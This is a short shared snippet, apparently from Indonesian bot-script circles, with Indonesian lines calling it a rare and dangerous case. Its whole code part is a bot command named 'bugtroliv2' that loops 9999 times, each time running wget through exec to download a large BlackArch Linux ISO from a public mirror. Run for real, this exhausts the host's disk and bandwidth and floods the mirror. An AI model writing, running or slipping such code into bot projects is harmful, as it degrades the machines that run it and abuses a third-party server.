[❗] JANGAN DI SHARE YA🔥
[❗] SUBSCRIBE YT RIMURUBOTZ

     case 'bugtroliv2':
     for (let i = 0; i < 9999; i++) {
     exec('wget https://ftp.halifax.rwth-aachen.de/blackarch/iso/blackarch-linux-full-2020.12.01-x86_64.iso', (err, stdout) => {
       if (err) throw err
       console.log('🔥SUKSES🔥')
          console.log('🔥') 
           })
           } 
           break

[❗] TUH CASE LANGKA 🔥🔥
[❗] ITU BERBAHAYA JADI MENDING GK USH🔥